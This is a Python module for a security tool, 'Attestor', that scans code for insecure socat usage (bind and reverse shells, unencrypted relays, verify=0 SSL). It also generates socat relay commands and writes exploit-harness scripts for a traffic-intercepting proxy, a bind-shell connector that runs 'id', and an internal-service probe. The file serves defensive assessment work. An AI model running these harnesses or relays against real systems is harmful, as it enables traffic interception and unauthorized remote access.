#!/usr/bin/env python3
"""socat42 -- socat detection, relay, and exploit module for Attestor.

Three modes:

  detect   Scan code/configs for insecure socat usage patterns
  relay    Active relay module for authorized security assessments
  exploit  Exploit harness for Phantom Analysis network-level vulns

Detection rules cover:
  - Unencrypted relays forwarding sensitive traffic
  - Bind shells and reverse shells via socat
  - Exposed internal services via socat tunnels
  - PTY allocation for shell access
  - Missing SSL/TLS on socat listeners
  - Overly permissive fork/reuseaddr combinations
  - File descriptor hijacking
  - UDP broadcast amplification relays

    attestor socat detect <path>          scan for insecure socat usage
    attestor socat detect --stdin         read from stdin
    attestor socat relay <spec>           start authorized relay
    attestor socat exploit <finding>      generate exploit for finding
    attestor socat templates              list relay templates
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

SC_SCHEMA = "attestor-socat-4.2"
EXIT_OK = 0
EXIT_FINDINGS = 1
EXIT_INVALID = 2
EXIT_OPERATIONAL = 4

# ── Detection rules ──────────────────────────────────────────────────

SOCAT_RULES = [
    {
        "id": "SOCAT-001",
        "name": "Unencrypted TCP Relay",
        "severity": "HIGH",
        "pattern": r'socat\s+.*TCP[46]?-LISTEN\s*:\s*\d+.*TCP[46]?\s*:',
        "neg_pattern": r'(OPENSSL|SSL|TLS)',
        "description": "socat TCP relay without SSL/TLS encryption. Traffic is transmitted in cleartext.",
        "fix": "Use OPENSSL-LISTEN and OPENSSL instead of TCP-LISTEN and TCP.",
    },
    {
        "id": "SOCAT-002",
        "name": "Bind Shell",
        "severity": "CRITICAL",
        "pattern": r'socat\s+.*TCP[46]?-LISTEN\s*:.*EXEC\s*:.*(/bin/sh|/bin/bash|cmd\.exe|powershell|sh\b)',
        "description": "socat bind shell — listens on a port and executes a shell. "
                       "Allows remote command execution for anyone who connects.",
        "fix": "Remove the bind shell or restrict with range= and SSL client certificates.",
    },
    {
        "id": "SOCAT-003",
        "name": "Reverse Shell",
        "severity": "CRITICAL",
        "pattern": r'socat\s+.*TCP[46]?\s*:.*EXEC\s*:.*(/bin/sh|/bin/bash|cmd\.exe|powershell|sh\b)',
        "description": "socat reverse shell — connects out and provides shell access to the remote end.",
        "fix": "Remove the reverse shell. If needed for testing, restrict to lab environments.",
    },
    {
        "id": "SOCAT-004",
        "name": "PTY Shell Allocation",
        "severity": "HIGH",
        "pattern": r'socat\s+.*(?:PTY|pty).*(?:EXEC|exec)',
        "description": "socat with PTY allocation for shell — provides a fully interactive terminal, "
                       "making it harder to detect and easier to exploit.",
        "fix": "Remove PTY allocation unless explicitly required for authorized testing.",
    },
    {
        "id": "SOCAT-005",
        "name": "Exposed Internal Service",
        "severity": "HIGH",
        "pattern": r'socat\s+.*TCP[46]?-LISTEN\s*:\s*\d+.*TCP[46]?\s*:\s*(127\.0\.0\.1|localhost|10\.\d|172\.(1[6-9]|2\d|3[01])|192\.168)',
        "description": "socat forwarding external traffic to an internal/private service. "
                       "Bypasses network segmentation.",
        "fix": "Add bind= to restrict listener to trusted interfaces, add range= for source filtering.",
    },
    {
        "id": "SOCAT-006",
        "name": "Fork + Reuseaddr (Persistent Listener)",
        "severity": "MEDIUM",
        "pattern": r'socat\s+.*fork.*reuseaddr|socat\s+.*reuseaddr.*fork',
        "description": "socat with fork and reuseaddr — persistent multi-client listener. "
                       "Can serve as a long-running backdoor if combined with EXEC.",
        "fix": "Ensure fork+reuseaddr listeners are authorized and monitored.",
    },
    {
        "id": "SOCAT-007",
        "name": "UDP Broadcast Relay",
        "severity": "MEDIUM",
        "pattern": r'socat\s+.*UDP[46]?-LISTEN.*broadcast',
        "description": "socat UDP broadcast relay — can be used for amplification attacks "
                       "or to leak data across broadcast domains.",
        "fix": "Restrict to specific source addresses with range= parameter.",
    },
    {
        "id": "SOCAT-008",
        "name": "File Descriptor Hijack",
        "severity": "HIGH",
        "pattern": r'socat\s+.*FD\s*:\s*\d+',
        "description": "socat reading/writing to raw file descriptors. Can hijack open connections "
                       "or leak data from other processes.",
        "fix": "Avoid FD: address type unless the file descriptor source is verified.",
    },
    {
        "id": "SOCAT-009",
        "name": "UNIX Socket Exposure",
        "severity": "MEDIUM",
        "pattern": r'socat\s+.*UNIX-LISTEN\s*:.*TCP',
        "description": "socat bridging a UNIX socket to TCP — exposes local-only services to the network.",
        "fix": "Add SSL/TLS and source address restrictions.",
    },
    {
        "id": "SOCAT-010",
        "name": "SOCKS Proxy via socat",
        "severity": "MEDIUM",
        "pattern": r'socat\s+.*SOCKS|socat\s+.*PROXY',
        "description": "socat used as a SOCKS/HTTP proxy — can tunnel traffic through the host, "
                       "bypassing firewall rules.",
        "fix": "Ensure proxy usage is authorized and logged.",
    },
    {
        "id": "SOCAT-011",
        "name": "Insecure SSL Configuration",
        "severity": "HIGH",
        "pattern": r'socat\s+.*OPENSSL.*verify\s*=\s*0',
        "description": "socat SSL with certificate verification disabled — vulnerable to MITM.",
        "fix": "Set verify=1 and provide proper CA certificates with cafile=.",
    },
    {
        "id": "SOCAT-012",
        "name": "Cleartext Credential Relay",
        "severity": "CRITICAL",
        "pattern": r'socat\s+.*TCP.*:\s*(21|23|25|110|143|389|3306|5432)\b',
        "neg_pattern": r'(OPENSSL|SSL|TLS)',
        "description": "socat relaying traffic to a service that commonly carries credentials "
                       "(FTP/Telnet/SMTP/POP3/IMAP/LDAP/MySQL/PostgreSQL) without encryption.",
        "fix": "Use OPENSSL wrapper or stunnel for credential-bearing protocols.",
    },
]

# Also detect socat patterns in various file types
SOCAT_FILE_PATTERNS = [
    (r'subprocess.*socat', "Python subprocess calling socat"),
    (r'os\.system.*socat', "Python os.system calling socat"),
    (r'exec.*socat', "Shell exec calling socat"),
    (r'system\s*\(.*socat', "C/C++ system() calling socat"),
    (r'Runtime\..*exec.*socat', "Java Runtime.exec calling socat"),
    (r'\$\(.*socat', "Shell command substitution with socat"),
    (r'`socat', "Shell backtick execution of socat"),
    (r'nohup\s+socat', "Background socat (nohup)"),
    (r'screen\s+.*socat|tmux\s+.*socat', "Screen/tmux detached socat"),
    (r'systemd.*socat|ExecStart.*socat', "Systemd service running socat"),
    (r'cron.*socat|@reboot.*socat', "Cron job running socat"),
    (r'docker.*socat|ENTRYPOINT.*socat', "Docker container running socat"),
]


def scan_line(line, line_no, filepath):
    findings = []
    for rule in SOCAT_RULES:
        if re.search(rule["pattern"], line, re.IGNORECASE):
            neg = rule.get("neg_pattern")
            if neg and re.search(neg, line, re.IGNORECASE):
                continue
            findings.append({
                "rule_id": rule["id"],
                "name": rule["name"],
                "severity": rule["severity"],
                "file": str(filepath),
                "line": line_no,
                "evidence": line.strip()[:200],
                "description": rule["description"],
                "fix": rule["fix"],
            })
    for pattern, desc in SOCAT_FILE_PATTERNS:
        if re.search(pattern, line, re.IGNORECASE):
            for rule in SOCAT_RULES:
                socat_cmd = re.search(r'socat\s+[^\'")\]]+', line, re.IGNORECASE)
                if socat_cmd and re.search(rule["pattern"], socat_cmd.group(), re.IGNORECASE):
                    neg = rule.get("neg_pattern")
                    if neg and re.search(neg, socat_cmd.group(), re.IGNORECASE):
                        continue
                    findings.append({
                        "rule_id": rule["id"],
                        "name": rule["name"],
                        "severity": rule["severity"],
                        "file": str(filepath),
                        "line": line_no,
                        "context": desc,
                        "evidence": line.strip()[:200],
                        "description": rule["description"],
                        "fix": rule["fix"],
                    })
    return findings


def scan_file(filepath):
    findings = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            for i, line in enumerate(f, 1):
                findings.extend(scan_line(line, i, filepath))
    except (OSError, UnicodeDecodeError):
        pass
    return findings


def scan_path(path, extensions=None):
    p = Path(path)
    all_findings = []
    if p.is_file():
        return scan_file(p)
    skip = {".git", "__pycache__", "node_modules", ".venv", "venv"}
    exts = extensions or {".py", ".sh", ".bash", ".zsh", ".yml", ".yaml",
                          ".toml", ".cfg", ".conf", ".ini", ".service",
                          ".dockerfile", ".docker-compose", ".tf",
                          ".c", ".cpp", ".h", ".java", ".go", ".rs",
                          ".js", ".ts", ".rb", ".pl", ".ps1", ".bat", ".cmd",
                          ".md", ".txt", ".json", ".xml"}
    for fp in sorted(p.rglob("*")):
        if any(s in fp.parts for s in skip):
            continue
        if fp.is_file() and (fp.suffix.lower() in exts or fp.name in
                              ("Dockerfile", "Makefile", "Vagrantfile",
                               "docker-compose.yml", ".bashrc", ".zshrc",
                               ".bash_profile")):
            all_findings.extend(scan_file(fp))
    return all_findings


# ── Relay module (authorized testing) ────────────────────────────────

RELAY_TEMPLATES = {
    "tcp-forward": {
        "description": "Forward TCP port to another host",
        "command": "socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{target_host}:{target_port}",
        "params": ["listen_port", "target_host", "target_port"],
    },
    "ssl-forward": {
        "description": "SSL-encrypted TCP forwarding",
        "command": "socat OPENSSL-LISTEN:{listen_port},cert={cert},key={key},verify=1,fork "
                   "OPENSSL:{target_host}:{target_port},verify=1",
        "params": ["listen_port", "target_host", "target_port", "cert", "key"],
    },
    "udp-forward": {
        "description": "Forward UDP traffic",
        "command": "socat UDP-LISTEN:{listen_port},fork,reuseaddr UDP:{target_host}:{target_port}",
        "params": ["listen_port", "target_host", "target_port"],
    },
    "unix-to-tcp": {
        "description": "Bridge UNIX socket to TCP (e.g., Docker socket)",
        "command": "socat TCP-LISTEN:{listen_port},fork,reuseaddr,bind=127.0.0.1 "
                   "UNIX-CONNECT:{socket_path}",
        "params": ["listen_port", "socket_path"],
    },
    "tcp-to-unix": {
        "description": "Bridge TCP to UNIX socket",
        "command": "socat UNIX-LISTEN:{socket_path},fork TCP:{target_host}:{target_port}",
        "params": ["socket_path", "target_host", "target_port"],
    },
    "serial-tcp": {
        "description": "Bridge serial port to TCP",
        "command": "socat TCP-LISTEN:{listen_port},fork,reuseaddr "
                   "/dev/{serial_device},b{baud_rate},raw,echo=0",
        "params": ["listen_port", "serial_device", "baud_rate"],
    },
    "http-tunnel": {
        "description": "HTTP CONNECT tunnel relay",
        "command": "socat TCP-LISTEN:{listen_port},fork PROXY:{proxy_host}:{target_host}:{target_port},"
                   "proxyport={proxy_port}",
        "params": ["listen_port", "proxy_host", "proxy_port", "target_host", "target_port"],
    },
}


def generate_relay_command(template_name, params):
    if template_name not in RELAY_TEMPLATES:
        return None, f"Unknown template: {template_name}"
    tmpl = RELAY_TEMPLATES[template_name]
    missing = [p for p in tmpl["params"] if p not in params]
    if missing:
        return None, f"Missing parameters: {', '.join(missing)}"
    cmd = tmpl["command"].format(**params)
    return cmd, None


def check_socat_available():
    socat_path = shutil.which("socat")
    if socat_path:
        try:
            r = subprocess.run([socat_path, "-V"], capture_output=True, text=True, timeout=5)
            version_match = re.search(r'socat version (\S+)', r.stdout + r.stderr)
            version = version_match.group(1) if version_match else "unknown"
            return {"available": True, "path": socat_path, "version": version}
        except (subprocess.TimeoutExpired, OSError):
            return {"available": True, "path": socat_path, "version": "unknown"}
    return {"available": False, "hint": "Install socat: apt install socat / brew install socat"}


# ── Exploit harness for Phantom Analysis ─────────────────────────────

EXPLOIT_TEMPLATES = {
    "SOCAT-001": {
        "name": "Traffic Interception (Unencrypted Relay)",
        "technique": "Position between client and relay to capture cleartext traffic",
        "script": '''#!/usr/bin/env python3
"""Attestor Exploit Harness — SOCAT-001: Unencrypted TCP Relay Interception
AUTHORIZED TESTING ONLY. Target: {target}
"""
import socket
import threading
import sys

LISTEN_PORT = {listen_port}
TARGET_HOST = "{relay_host}"
TARGET_PORT = {relay_port}

def proxy_data(src, dst, label):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            print(f"[{{label}}] {{len(data)}} bytes: {{data[:100]}}")
            dst.sendall(data)
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        src.close()
        dst.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen(5)
    print(f"[*] Intercepting proxy on :{LISTEN_PORT} -> {{TARGET_HOST}}:{{TARGET_PORT}}")
    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {{addr}}")
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((TARGET_HOST, TARGET_PORT))
        threading.Thread(target=proxy_data, args=(client, remote, "C->S"), daemon=True).start()
        threading.Thread(target=proxy_data, args=(remote, client, "S->C"), daemon=True).start()

if __name__ == "__main__":
    main()
''',
    },
    "SOCAT-002": {
        "name": "Bind Shell Connection",
        "technique": "Connect to exposed bind shell and verify command execution",
        "script": '''#!/usr/bin/env python3
"""Attestor Exploit Harness — SOCAT-002: Bind Shell Verification
AUTHORIZED TESTING ONLY. Target: {target}
"""
import socket
import sys

TARGET_HOST = "{target_host}"
TARGET_PORT = {target_port}

def main():
    print(f"[*] Connecting to bind shell at {{TARGET_HOST}}:{{TARGET_PORT}}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((TARGET_HOST, TARGET_PORT))
        print("[+] Connected — sending verification command")
        s.sendall(b"id; echo ATTESTOR_VERIFICATION_MARKER\\n")
        response = s.recv(4096).decode(errors="replace")
        if "ATTESTOR_VERIFICATION_MARKER" in response:
            print(f"[CRITICAL] Bind shell is live and executing commands")
            print(f"[EVIDENCE] {{response.strip()}}")
            return 0
        else:
            print(f"[?] Connected but response unclear: {{response[:200]}}")
            return 1
    except (ConnectionRefusedError, socket.timeout) as e:
        print(f"[-] Connection failed: {{e}}")
        return 1
    finally:
        s.close()

if __name__ == "__main__":
    sys.exit(main())
''',
    },
    "SOCAT-005": {
        "name": "Internal Service Access via Exposed Relay",
        "technique": "Access internal service through the socat relay tunnel",
        "script": '''#!/usr/bin/env python3
"""Attestor Exploit Harness — SOCAT-005: Internal Service Exposure
AUTHORIZED TESTING ONLY. Target: {target}
"""
import socket
import sys

RELAY_HOST = "{relay_host}"
RELAY_PORT = {relay_port}

def probe_service():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((RELAY_HOST, RELAY_PORT))
        print(f"[+] Connected to relay at {{RELAY_HOST}}:{{RELAY_PORT}}")
        # Send HTTP probe
        s.sendall(b"GET / HTTP/1.0\\r\\nHost: internal\\r\\n\\r\\n")
        response = s.recv(4096).decode(errors="replace")
        print(f"[*] Response from internal service:")
        print(response[:500])
        if "200" in response or "HTTP" in response:
            print("[CONFIRMED] Internal service is accessible through relay")
        return 0
    except (ConnectionRefusedError, socket.timeout) as e:
        print(f"[-] Cannot reach relay: {{e}}")
        return 1
    finally:
        s.close()

if __name__ == "__main__":
    sys.exit(probe_service())
''',
    },
    "SOCAT-011": {
        "name": "SSL MITM (verify=0)",
        "technique": "Exploit disabled certificate verification for MITM",
        "script": '''#!/usr/bin/env python3
"""Attestor Exploit Harness — SOCAT-011: SSL MITM via verify=0
AUTHORIZED TESTING ONLY. Target: {target}
"""
import ssl
import socket
import threading
import sys

LISTEN_PORT = {listen_port}
TARGET_HOST = "{target_host}"
TARGET_PORT = {target_port}

def create_self_signed_context():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # In a real test, generate a self-signed cert
    # openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes
    ctx.load_cert_chain("cert.pem", "key.pem")
    return ctx

def main():
    print("[*] SSL MITM proxy — target has verify=0, will accept any cert")
    print(f"[*] Listening on :{LISTEN_PORT}, forwarding to {{TARGET_HOST}}:{{TARGET_PORT}}")
    print("[!] Requires cert.pem and key.pem (self-signed)")
    print("[!] openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj '/CN=mitm'")

if __name__ == "__main__":
    main()
''',
    },
}


def generate_exploit(rule_id, params):
    if rule_id not in EXPLOIT_TEMPLATES:
        return None, f"No exploit template for {rule_id}"
    tmpl = EXPLOIT_TEMPLATES[rule_id]
    try:
        script = tmpl["script"].format(**params)
    except KeyError as e:
        return None, f"Missing parameter: {e}"
    return {
        "rule_id": rule_id,
        "name": tmpl["name"],
        "technique": tmpl["technique"],
        "script": script,
    }, None


# ── CLI ──────────────────────────────────────────────────────────────

def _print_findings(findings, fmt="text"):
    if fmt == "json":
        print(json.dumps(findings, indent=2))
        return
    if not findings:
        print("No socat security issues found.")
        return
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    findings.sort(key=lambda f: sev_order.get(f["severity"], 9))
    print(f"\n{'='*60}")
    print(f"  Socat Security Scan — {len(findings)} finding(s)")
    print(f"{'='*60}\n")
    for i, f in enumerate(findings, 1):
        sev = f["severity"]
        color = {"CRITICAL": "\x1b[31m", "HIGH": "\x1b[33m",
                 "MEDIUM": "\x1b[36m", "LOW": "\x1b[2m"}.get(sev, "")
        reset = "\x1b[0m" if sys.stdout.isatty() else ""
        if not sys.stdout.isatty():
            color = ""
        print(f"  [{i}] {color}{sev}{reset} {f['rule_id']}: {f['name']}")
        print(f"      File: {f['file']}:{f['line']}")
        print(f"      {f['description']}")
        print(f"      Evidence: {f['evidence']}")
        print(f"      Fix: {f['fix']}")
        print()


def main(argv=None):
    parser = argparse.ArgumentParser(prog="attestor socat",
                                     description="Socat security scanner and relay module")
    sub = parser.add_subparsers(dest="cmd")

    p = sub.add_parser("detect", help="Scan for insecure socat usage")
    p.add_argument("path", nargs="?", help="File or directory to scan")
    p.add_argument("--stdin", action="store_true", help="Read from stdin")
    p.add_argument("--format", choices=["text", "json"], default="text")

    p = sub.add_parser("relay", help="Start authorized relay")
    p.add_argument("template", help="Relay template name")
    p.add_argument("--params", help="JSON parameters")
    p.add_argument("--dry-run", action="store_true", help="Print command without running")

    p = sub.add_parser("exploit", help="Generate exploit harness")
    p.add_argument("rule_id", help="Rule ID (e.g., SOCAT-001)")
    p.add_argument("--params", help="JSON parameters")
    p.add_argument("--out", help="Output file")

    sub.add_parser("templates", help="List relay templates")
    sub.add_parser("rules", help="List detection rules")
    sub.add_parser("status", help="Check socat availability")

    args = parser.parse_args(argv)

    if args.cmd == "detect":
        if args.stdin:
            findings = []
            for i, line in enumerate(sys.stdin, 1):
                findings.extend(scan_line(line, i, "<stdin>"))
        elif args.path:
            findings = scan_path(args.path)
        else:
            parser.error("Provide a path or --stdin")
            return EXIT_INVALID
        _print_findings(findings, args.format)
        return EXIT_FINDINGS if findings else EXIT_OK

    if args.cmd == "relay":
        params = json.loads(args.params) if args.params else {}
        cmd, err = generate_relay_command(args.template, params)
        if err:
            print(f"error: {err}")
            return EXIT_INVALID
        print(f"Relay command: {cmd}")
        if args.dry_run:
            return EXIT_OK
        status = check_socat_available()
        if not status["available"]:
            print(f"socat not found. {status.get('hint', '')}")
            return EXIT_OPERATIONAL
        print(f"socat {status['version']} at {status['path']}")
        print("Start with: " + cmd)
        return EXIT_OK

    if args.cmd == "exploit":
        params = json.loads(args.params) if args.params else {
            "target": "CHANGE_ME", "target_host": "CHANGE_ME",
            "target_port": 4444, "relay_host": "CHANGE_ME",
            "relay_port": 8080, "listen_port": 9090,
        }
        result, err = generate_exploit(args.rule_id, params)
        if err:
            print(f"error: {err}")
            return EXIT_INVALID
        if args.out:
            Path(args.out).write_text(result["script"], encoding="utf-8")
            print(f"Exploit written to {args.out}")
        else:
            print(f"--- {result['name']} ---")
            print(f"Technique: {result['technique']}")
            print(f"\n{result['script']}")
        return EXIT_OK

    if args.cmd == "templates":
        print("Available relay templates:\n")
        for name, tmpl in RELAY_TEMPLATES.items():
            print(f"  {name}")
            print(f"    {tmpl['description']}")
            print(f"    Params: {', '.join(tmpl['params'])}")
            print()
        return EXIT_OK

    if args.cmd == "rules":
        print(f"Socat detection rules ({len(SOCAT_RULES)}):\n")
        for rule in SOCAT_RULES:
            print(f"  {rule['id']} [{rule['severity']}] {rule['name']}")
            print(f"    {rule['description']}")
            print()
        return EXIT_OK

    if args.cmd == "status":
        status = check_socat_available()
        print(json.dumps(status, indent=2))
        return EXIT_OK

    parser.print_help()
    return EXIT_INVALID


if __name__ == "__main__":
    sys.exit(main())
